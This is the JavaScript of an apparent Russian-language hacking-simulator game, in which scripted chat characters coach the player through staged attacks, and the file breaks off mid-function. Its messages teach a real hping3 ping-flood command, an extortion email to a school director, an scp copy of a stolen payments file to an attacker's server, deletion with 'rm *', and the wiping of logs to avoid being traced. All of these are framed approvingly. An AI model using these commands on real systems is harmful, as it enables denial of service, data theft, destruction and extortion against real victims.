const output = document.getElementById("output");
const input = document.getElementById("cmd");
const go = document.querySelector(".btn_go");

function scrollOutputToBottom() {
    const output = document.getElementById('output');
    output.scrollTop = output.scrollHeight;
}

const audio1 = new Audio('./message.wav');
const new_mesage_alert = () => {
    audio1.play();
}

const audio2 = new Audio('./error.wav');
const new_error_alert = () => {
    audio2.play();
}

const promise = new Promise((resolve, reject) => {
    resolve('done')
});

const add_new_message = (text) => {
    const message = document.createElement('div');
    message.classList.add('message');
    message.innerHTML = text;
    output.insertAdjacentElement('beforeend', message);
    scrollOutputToBottom()
}


promise.then(() => {
    new_mesage_alert()
    add_new_message('<span class="moderator">{[Moderator]}</span> Mems в сети<br>')
    return new Promise(resolve => setTimeout(resolve, 3000));
})
    .then(() => {

        input.placeholder = 'Command panel...';
        new_mesage_alert()
        add_new_message('<span class="mems">{[Mems]}</span> Привет! Это Mems. Я пообщался с Adidas, он у нас из олдов, отвечает за новеньких.<br>')
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Mems]}</span> Штука такая, к нам сейчас не попасть, набор закрыт. Копы под нас роют, так что секретность. все дела.<br>')
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Mems]}</span> Но Adidas мне должен, так что с тобой он поговорит.<br>')
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Mems]}</span> Правда он неособо дружелюбен, после того, как ему на голову сервер упал. Ты необращай внимания, 20 кг все-таки))) Но он все равно мастер, есть чему поучиться.<br>')
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Mems]}</span> Повтори, что мы с тобой делали в прошлый раз, я уверен, тебе это пригодится. Отправил мануал, чекай!<br>')
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="alert">{[Alert]}</span> Вам сообщение от Mems<br>')
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message(`
        <br><br>1. print_message --m - команда для вывода. Текст пишем внутри скобок в кавычках<br>
        2. connect - подключиться к серверу. Нужно указать ip<br>
        3. disconnect - отключиться от сервера. Ничего указывать больше не надо<br>
        4. apt install - установка программ в Linux системах. Надо указать название программы<br>
        5. hping3 -1 --flood 177.201.7.21 - DoS ping flood атака на сервер 177.201.7.21<br>
                                            Вместо 177.201.7.21 вводим нужный ip.<br>
                                            Перед использованием надо запустить hping3<br>
        6. sendmessage_to: email - отправить емаил. Указать адрес.<br><br>`)
        return new Promise(resolve => setTimeout(resolve, 10000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="moderator">{[Moderator]}</span> Mems добавил в чат Adidas<br>')
        return new Promise(resolve => setTimeout(resolve, 2000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Adidas]}</span> здравствуй! Меня Адидасом кличут. Мы сейчас порты закрыли, фаерволлы включили, джунов не хантим, изи на ментов попасть, так что чилим без движа.<br>')
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Adidas]}</span> Но Mems сказал, что ты свой, на тебя можно положиться. Пруфы предоставил. Я ему должен, так что пришел посмотреть на тебя в деле. Чекну твой скилл.<br>')
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Adidas]}</span> Надеюсь, ты готов. Даже если нет, мне собственно, плевать. Но не волнуйся, троллить тебя не буду. Есть заданьице для тебя.<br>')
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Adidas]}</span> У моего младшего брата ВПР в школе. А он всю ночь в ДОТу, баран играл. Ну как играл, сливал всем. Теперь ноет, что не сдаст, родоки ему такой треш устроят.<br>')
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Adidas]}</span><br> Так вот, урони школьный сервак, и пригрози директору, Крысе Петровне, что если она не поставит за впр всем отлично, то мы уроним всю их сеть, будут до конца дней на счетах работать. Инфу вышлю.<br>')
        return new Promise(resolve => setTimeout(resolve, 4000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Adidas]}</span> Всю инфу я тебе скинул. Покажи себе в деле.<br>')
        return new Promise(resolve => setTimeout(resolve, 5000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message(`<span class="mems">{[Adidas]}</span><br><br> Цель: Сервер школы 18974. <br>
        Директор: Раиса Петровна Шкалова<br>
        Электронная почта директора школы headmaster@shcool18974.gov<br>
        ip 8.8.72.16<br>
        Задача: Провести dos атаку методом ping-flood<br><br>`)
        return new Promise(resolve => setTimeout(resolve, 5000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message(`<span class="mems">{[Adidas]}</span><br> Поcле завершения атаки отправить директору письмо о том, чтобы перестала
        доставать детей и собирать с родителей деньги на шторы, швабры, уборку, охрану,
        завтраки, учебники и прочую чушь, а не то вся информация будет слита в прокуратуру/ и ей самой придется кое-что убирать.<br>
        В доказательство того, что директор согласна стать новым прекрасным человеком, пусть насчет с того,
        что поставит всем за впр отлично.<br>`)
        return new Promise(resolve => setTimeout(resolve, 5000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message(`<span class="mems">{[Adidas]}</span> Начинай!<br>`)
        return new Promise(resolve => setTimeout(resolve, 1000));
    })
    .then(() => {
        return new Promise((resolve, reject) => {

            input.placeholder = 'Command panel';

            new_mesage_alert()
            add_new_message('Введите команду hping3 для запуска ПО: <br>')

            go.addEventListener('click', function enterCommand(e) {

                if (input.value.trim().includes('hping3')) {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';

                    go.removeEventListener('click', enterCommand); // Удаляем обработчик события
                    resolve(input.value.trim());
                } else {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';
                    new_error_alert()
                    add_new_message('Вначале программу нужно запустить командой hping3<br>')
                }

            });
        });
    })
    .then(() => {

        new_mesage_alert()
        add_new_message(`initialization hping3<br><div class="loader"><span id="loader_count"></span>%<div id="loader_line"></div></div>`)
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('hping3 is activated<br>')
        input.placeholder = 'hping3 commands:';
        return new Promise(resolve => setTimeout(resolve, 1000));
    })
    .then(() => {
        return new Promise((resolve, reject) => {

            new_mesage_alert()
            add_new_message('Введите команду hping3 для начала атаки: <br>')

            go.addEventListener('click', function enterCommand(e) {

                if (input.value.trim() === 'hping3 -1 --flood 8.8.72.16') {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';

                    go.removeEventListener('click', enterCommand); // Удаляем обработчик события
                    resolve(input.value.trim());
                } else {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';
                    new_error_alert()
                    add_new_message('Команда введена неправильно, попробуйте снова<br>')
                }

            });
        });
    })
    .then(() => {

        new_mesage_alert()
        add_new_message(`Start DoS attack...<br><div class="loader"><span id="loader_count"></span>%<div id="loader_line"></div></div>`)
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('Attack starting...<br>')
        return new Promise(resolve => setTimeout(resolve, 1000));
    })
    .then(() => {

        for (let i = 1; i < 50; i++) {
            add_new_message(`request ${i} sent...<br>`)
        }
        return new Promise(resolve => setTimeout(resolve, 1000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message(`Attack completed. Server is not responding. Timed out request.<br>`)
        return new Promise(resolve => setTimeout(resolve, 1000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message(`<span class="mems">{[Adidas]}</span> Отлично! Теперь отправь сообщение директрисе.<br>`)
        return new Promise(resolve => setTimeout(resolve, 1000));
    })
    .then(() => {
        return new Promise((resolve, reject) => {

            // new_mesage_alert()
            // add_new_message('Введите команду hping3 для начала атаки: <br>')

            go.addEventListener('click', function enterCommand(e) {

                if (input.value.trim().includes('sendmessage_to:') && input.value.trim().includes('headmaster@shcool18974.gov')) {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';

                    go.removeEventListener('click', enterCommand); // Удаляем обработчик события
                    resolve(input.value.trim());
                } else {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';
                    new_error_alert()
                    add_new_message('Команда или адрес почты введены введены неправильно, попробуйте снова<br>')
                }

            });
        });
    })
    .then(() => {
        return new Promise((resolve, reject) => {

            go.addEventListener('click', function enterCommand(e) {

                if (input.value.trim().includes('print_message --m')) {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';

                    go.removeEventListener('click', enterCommand);
                    new_mesage_alert()
                    add_new_message('Message sent <br>')
                    resolve(input.value.trim());
                } else {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';
                    new_error_alert()
                    add_new_message('Ожидается команда print_message --m your text<br>')
                }

            });
        });
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="alert">{[Alert]}</span> Вам сообщение от Adidas<br>')
        return new Promise(resolve => setTimeout(resolve, 2000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Adidas]}</span><br> Снова здорово. Брат отписался, ВПР сорван, Крыса Петровна бесится. Молодец. Я думаю, подищам тебе место в наших рядах.<br>')
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Adidas]}</span><br> Будешь нам пиццу заказывать. Я, кстати, люблю Деревенскую. Там перчик, петрушка, курочка. Все, как мне нравится. Так что закажи мне ее.<br>')
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Adidas]}</span><br> Хах! Купился! Не парься, шучу это я так. Нам твоя голова в деле понадобится. Слушай сюда.<br>')
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Adidas]}</span><br> Mems там ковыряется, чем-то занят. Напиши ему, что ты принят, и помоги. Вы с ним уже работали вместе. Я думаю, сейчас тоже толк выйдет.<br>')
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Adidas]}</span><br> Его почта mems@anonshack.edu<br>')
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {
        return new Promise((resolve, reject) => {

            // new_mesage_alert()
            // add_new_message('Введите команду hping3 для начала атаки: <br>')

            go.addEventListener('click', function enterCommand(e) {

                if (input.value.trim().includes('sendmessage_to:') && input.value.trim().includes('mems@anonshack.edu')) {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';

                    go.removeEventListener('click', enterCommand); // Удаляем обработчик события
                    resolve(input.value.trim());
                } else {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';
                    new_error_alert()
                    add_new_message('Команда или адрес почты введены введены неправильно, попробуйте снова<br>')
                }

            });
        });
    })
    .then(() => {
        return new Promise((resolve, reject) => {

            go.addEventListener('click', function enterCommand(e) {

                if (input.value.trim().includes('print_message --m')) {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';
                    input.placeholder = 'Commands:';

                    go.removeEventListener('click', enterCommand);
                    new_mesage_alert()
                    add_new_message('Message sent <br>')
                    resolve(input.value.trim());
                } else {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';
                    new_error_alert()
                    add_new_message('Ожидается команда print_message --m your text<br>')
                }

            });
        });
    })
    .then(() => {

        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="moderator">{[Moderator]}</span> Mems в сети<br>')
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Mems]}</span> Ты прошел! Молодец! Я в тебе не сомневался. Рад, что будешь мне помогать<br>')
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Mems]}</span> Сейчас я научу тебя новой штуке. К сожалению, мы не всегда знаем пароль от нужного сервера. Да и не всегда знаем его ip<br>')
        return new Promise(resolve => setTimeout(resolve, 5000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Mems]}</span> Способов взлома паролей несколько. Один из них я тебе сейчас покажу. Запоминай<br>')
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Mems]}</span> Есть способ - bruteforce(Брут форсе или просто брут). По-другому - атака «грубой силой»<br>')
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Mems]}</span>Суть его в том, что мы берем каку-то базу данных слов, например, словарь, или слитые пароли, и методом проб находим нужный. Если нужного пароля в этой базе нет, то взлом не удастся.<br>')
        return new Promise(resolve => setTimeout(resolve, 5000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Mems]}</span>Но, большинство пользователей не блещут мозгом, так что используют пароли по типу: 1234567, qwerty, password и их комбинации. У нас есть базы, в которых по несколько миллионов самый частоиспользуемых паролей. Надеюсь, у тебя везде стоит надежный пароль? :)<br>')
        return new Promise(resolve => setTimeout(resolve, 5000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Mems]}</span>Так вот, я тебе дам нашу базу, сможешь подбирать пароль для большиства серваков. Естественно, сам ты будешь делать это пока не поседеешь, поэтому есть спец софт.<br>')
        return new Promise(resolve => setTimeout(resolve, 5000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Mems]}</span>Запускаешь его, цепляешь базу паролей и чилишь, пока за тебя все сделают. Круто же? )<br>')
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Mems]}</span>Прога называется bruteX. Работает очень просто. Устанавливаешь через  apt install brutex. Затем говоришь через атрибут, откуда брать словарь, а потом скармливаешь ip цели. И вуаля! Готово)<br>')
        return new Promise(resolve => setTimeout(resolve, 5000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Mems]}</span>Адрес нашего словаря //lohslovar.edu/new_version<br>')
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Mems]}</span>Чтобы запустить софту как всегда, пишешь ее название brutex<br>')
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Mems]}</span>Затем вызываешь команду -BruteX с атрибутом $Attribution link: //lohslovar.edu чтобы подключить словарь<br>')
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Mems]}</span> -BruteX $Attribution link: //lohslovar.edu<br>')
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Mems]}</span> И уже затем скармливаешь ему цель. например, ip 192.1.1.10: -BruteX 192.1.1.10<br>')
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Mems]}</span>Штука поработает, и даст тебе имя пользователя и пароль, если в нашей базе есть совпадение<br>')
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Mems]}</span>Я уже чувствую, что тебе не терпится попробовать! Давай. Твоя цель - хакнуть сервак с ip 77.13.212.10. Это сервак лотбуксов. Они деньги принимают, а из ящиков ничего не падает. Уже кучу народу нагрели. Надо вернуть справедливость!<br>')
        return new Promise(resolve => setTimeout(resolve, 5000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Mems]}</span>Установи BruteX и сделай все, как я показал!<br>')
        return new Promise(resolve => setTimeout(resolve, 1000));
    })
    .then(() => {
        return new Promise((resolve, reject) => {

            // new_mesage_alert()
            // add_new_message('Введите команду hping3 для начала атаки: <br>')

            go.addEventListener('click', function enterCommand(e) {

                if (input.value.trim().includes('apt install brutex')) {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';

                    go.removeEventListener('click', enterCommand); // Удаляем обработчик события
                    resolve(input.value.trim());
                } else {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';
                    new_error_alert()
                    add_new_message('Команда не найдена, попробуйте снова<br>')
                }

            });
        });
    })
    .then(() => {

        new_mesage_alert()
        add_new_message(`Идет установка...<br><div class="loader"><span id="loader_count"></span>%<div id="loader_line"></div></div>`)
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {
        return new Promise((resolve, reject) => {

            // new_mesage_alert()
            // add_new_message('Введите команду hping3 для начала атаки: <br>')

            go.addEventListener('click', function enterCommand(e) {

                if (input.value.trim().includes('brutex')) {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';
                    input.placeholder = 'brutex command:';

                    go.removeEventListener('click', enterCommand); // Удаляем обработчик события
                    resolve(input.value.trim());
                } else {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';
                    new_error_alert()
                    add_new_message('Команда не найдена, попробуйте снова<br>')
                }

            });
        });
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('brutex starting...<br>')
        return new Promise(resolve => setTimeout(resolve, 5000));
    })
    .then(() => {
        return new Promise((resolve, reject) => {

            // new_mesage_alert()
            // add_new_message('Введите команду hping3 для начала атаки: <br>')

            go.addEventListener('click', function enterCommand(e) {

                if (input.value.trim().includes('-BruteX $Attribution link: //lohslovar.edu')) {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';

                    go.removeEventListener('click', enterCommand); // Удаляем обработчик события
                    resolve(input.value.trim());
                } else {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';
                    new_error_alert()
                    add_new_message('Словарь не подключен или ссылка на словарь не активна. Убедитесь в правильности ввода<br>')
                }

            });
        });
    })
    .then(() => {
        return new Promise((resolve, reject) => {

            // new_mesage_alert()
            // add_new_message('Введите команду hping3 для начала атаки: <br>')

            go.addEventListener('click', function enterCommand(e) {

                if (input.value.trim().includes('-BruteX 77.13.212.10')) {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';
                    input.placeholder = 'Commands';

                    go.removeEventListener('click', enterCommand); // Удаляем обработчик события
                    resolve(input.value.trim());
                } else {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';
                    new_error_alert()
                    add_new_message('команда или ip адрес введены неверно. Попробуйте снова.<br>')
                }

            });
        });
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('Command correct. Connections 77.13.212.10 <br> <div class="loader"><span id="loader_count"></span>%<div id="loader_line"></div></div><br>')
        return new Promise(resolve => setTimeout(resolve, 5000));
    })
    .then(() => {

        for (let i = 1; i < 10; i++) {
            add_new_message(`Attacking-${i} ip 77.13.212.10...<br>`)
        }
        return new Promise(resolve => setTimeout(resolve, 1000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message(`<br>
        Attack completed.<br>
        host 77.13.212.10 login: denny password: 1234567<br>
        host 77.13.212.10 login: max password: qwerty1234567890<br>
        host 77.13.212.10 login: jenny password: Jen121997<br>
        host 77.13.212.10 login: administrator password: IamGoodAdmin2000<br><br>`)
        return new Promise(resolve => setTimeout(resolve, 5000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Mems]}</span>Да ты ИМБА! Отлично вышло! Тебе вывели список всех логинов/паролей, которые удалось подобрать. Ищи админа и залетай на сервер командой connect<br>')
        return new Promise(resolve => setTimeout(resolve, 5000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Mems]}</span>Затем посмотри список файлов на серваке командой ls. Там должен быть файл с платежами. Я думаю, ты поймешь по названию. Отправь его ко мне командой scp.<br>')
        return new Promise(resolve => setTimeout(resolve, 5000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Mems]}</span>Команды ls и scp - это команды Linux систем. Самой главной операционной системы для тру хакеров. Я думаю, со временем, ты на нее перейдешь<br>')
        return new Promise(resolve => setTimeout(resolve, 5000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message(`<span class="mems">{[Mems]}</span>Тебе понядобятся команды:<br><br>
        ls - посмотреть список файлов<br>
        cp - скоприровать файл (нужно указать, куда копировать)<br>
        mv - переместить файл в другую папку или на флешку<br>
        rm - удалить файл<br>
        scp - переместить файл на другой сервер<br><br>`)
        return new Promise(resolve => setTimeout(resolve, 5000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Mems]}</span>После того, как ты займешься настоящими взломами, надо будет на каждом серваке удалять файлы с логами, чтобы никто тебя не отследил. Но это дальше<br>')
        return new Promise(resolve => setTimeout(resolve, 4000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Mems]}</span>Сейчас ты просто зайдешь туда под админом, переместишь файл с данными о деньгах ко мне и удалишь все, что есть на сервере этих неудачников командой rm *<br>')
        return new Promise(resolve => setTimeout(resolve, 4000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Mems]}</span>Чтобы перместить файл ко мне, я дам тебе доступ к своему личному серверу. ip 10.99.77.101. Введшь команду scp имя_файла 10.99.77.101<br>')
        return new Promise(resolve => setTimeout(resolve, 4000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Mems]}</span>После этого отключись от сервера командой disconnect и dosни его. А затем пошли им на почту какое-нибудь злобное сообщение от Annos на почту admin@bstloot.cm Не забывай, ты теперь с нами!<br>')
        return new Promise(resolve => setTimeout(resolve, 4000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Mems]}</span>Go!go!go!<br>')
        return new Promise(resolve => setTimeout(resolve, 2000));
    })
    .then(() => {
        return new Promise((resolve, reject) => {

            // new_mesage_alert()
            // add_new_message('Введите команду hping3 для начала атаки: <br>')

            go.addEventListener('click', function enterCommand(e) {

                if (input.value.trim() === 'connect') {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';

                    go.removeEventListener('click', enterCommand); // Удаляем обработчик события
                    resolve(input.value.trim());
                } else {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';
                    new_error_alert()
                    add_new_message('Команда не найдена, попробуйте снова<br>')
                }

            });
        });
    })
    .then(() => {

        new_mesage_alert()
        add_new_message(`Подключение...<br><div class="loader"><span id="loader_count"></span>%<div id="loader_line"></div></div>`)
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message(`<span class="police">{[Server]}</span> connection established<br>`)
        return new Promise(resolve => setTimeout(resolve, 1000));
    })
    .then(() => {
        return new Promise((resolve, reject) => {

            new_mesage_alert()
            add_new_message('<span class="police">{[Server]}</span> Введите логин:<br>')
            input.placeholder = 'Введите логин:';

            go.addEventListener('click', function enterCommand(e) {

                if (input.value.trim() === 'administrator') {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';

                    go.removeEventListener('click', enterCommand); // Удаляем обработчик события
                    resolve(input.value.trim());
                } else if (input.value.trim() === 'denny' || input.value.trim() === 'max' || input.value.trim() === 'jenny') {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    new_error_alert()
                    add_new_message(`${input.value.trim()} доступ временно ограничен обратитесь к системному администратору<br>`)
                    input.value = '';
                } else {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';
                    new_error_alert()
                    add_new_message('Пользователь с таким логином не найден<br>')
                }

            });
        });
    })
    .then(() => {
        return new Promise((resolve, reject) => {

            new_mesage_alert()
            add_new_message('<span class="police">{[Server]}</span> Введите пароль:<br>')
            input.placeholder = 'Введите пароль:';

            go.addEventListener('click', function enterCommand(e) {

                if (input.value.trim() === 'IamGoodAdmin2000') {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';
                    input.placeholder = 'Commands:';
                    go.removeEventListener('click', enterCommand); // Удаляем обработчик события
                    resolve(input.value.trim());
                } else {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';
                    new_error_alert()
                    add_new_message('Пароль неверен<br>')
                }

            });
        });
    })
    .then(() => {

        new_mesage_alert()
        add_new_message(`<span class="police">{[Server]}</span> Администратор в сети. Доступ разрешен<br>`)
        return new Promise(resolve => setTimeout(resolve, 1000));
    })
    .then(() => {
        return new Promise((resolve, reject) => {

            // new_mesage_alert()
            // add_new_message('<span class="police">{[Server]}</span> Введите пароль:<br>')
            // input.placeholder = 'Введите пароль:';

            go.addEventListener('click', function enterCommand(e) {

                if (input.value.trim() === 'ls') {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';

                    go.removeEventListener('click', enterCommand); // Удаляем обработчик события
                    resolve(input.value.trim());
                } else {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';
                    new_error_alert()
                    add_new_message('Команда не найдена <br>')
                }

            });
        });
    })
    .then(() => {

        new_mesage_alert()
        add_new_message(`<span class="police">{[Server]}</span> Список файлов:<br><br>
        games<br>
        windows<br>
        docs<br>
        profile.temp<br>
        оплаты.xls<br>
        logs.txt<br><br>`)
        return new Promise(resolve => setTimeout(resolve, 5000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Mems]}</span>Прекрасно, чел, ты на серваке. Видишь файл оплаты.xls. Я думаю, все там. Отпавить его мне командой scp оплаты.xls 10.99.77.101<br>')
        return new Promise(resolve => setTimeout(resolve, 4000));
    })
    .then(() => {
        return new Promise((resolve, reject) => {

            // new_mesage_alert()
            // add_new_message('<span class="police">{[Server]}</span> Введите пароль:<br>')
            // input.placeholder = 'Введите пароль:';

            go.addEventListener('click', function enterCommand(e) {

                if (input.value.trim() === 'scp оплаты.xls 10.99.77.101') {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';

                    go.removeEventListener('click', enterCommand); // Удаляем обработчик события
                    resolve(input.value.trim());
                } else {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';
                    new_error_alert()
                    add_new_message('Команда не найдена или не может быть выполнена. введите еще раз <br>')
                }

            });
        });
    })
    .then(() => {

        return new Promise(resolve => setTimeout(resolve, 2000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Mems]}</span>Супер, файл у меня! Ты прям растешь на глазах! А теперь удали все, что там есть, вместе с логами, командой rm *<br>')
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {
        return new Promise((resolve, reject) => {

            // new_mesage_alert()
            // add_new_message('<span class="police">{[Server]}</span> Введите пароль:<br>')
            // input.placeholder = 'Введите пароль:';

            go.addEventListener('click', function enterCommand(e) {

                if (input.value.trim() === 'rm *') {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';

                    go.removeEventListener('click', enterCommand); // Удаляем обработчик события
                    resolve(input.value.trim());
                } else {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';
                    new_error_alert()
                    add_new_message('Команда не найдена или не может быть выполнена. введите еще раз <br>')
                }

            });
        });
    })
    .then(() => {

        new_mesage_alert()
        add_new_message(`Удаление файлов <br><div class="loader"><span id="loader_count"></span>%<div id="loader_line"></div></div>`)
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message(`Файлы удалены.<br>`)
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Mems]}</span>Теперь вали с сервера командой disconnect и завали его flood-ping через hping3. Напоминаю, ip их сервера 77.13.212.10. И не забудь отпавить письмо с пожеланиями admin@bstloot.cm<br>')
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {
        return new Promise((resolve, reject) => {

            // new_mesage_alert()
            // add_new_message('<span class="police">{[Server]}</span> Введите пароль:<br>')
            // input.placeholder = 'Введите пароль:';

            go.addEventListener('click', function enterCommand(e) {

                if (input.value.trim() === 'disconnect') {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';

                    go.removeEventListener('click', enterCommand); // Удаляем обработчик события
                    resolve(input.value.trim());
                } else {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';
                    new_error_alert()
                    add_new_message('Команда не найдена, попробуйте снова <br>')
                }

            });
        });
    })
    .then(() => {

        new_mesage_alert()
        add_new_message(`<div class="loader"><span id="loader_count"></span>%<div id="loader_line"></div></div>`)
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message(`<span class="police">{[Server]}</span>Вы отключились от сервера <br>`)
        return new Promise(resolve => setTimeout(resolve, 5000));
    })
    .then(() => {
        return new Promise((resolve, reject) => {

            input.placeholder = 'Command panel';

            new_mesage_alert()
            add_new_message('Введите команду hping3 для запуска ПО: <br>')

            go.addEventListener('click', function enterCommand(e) {

                if (input.value.trim().includes('hping3')) {
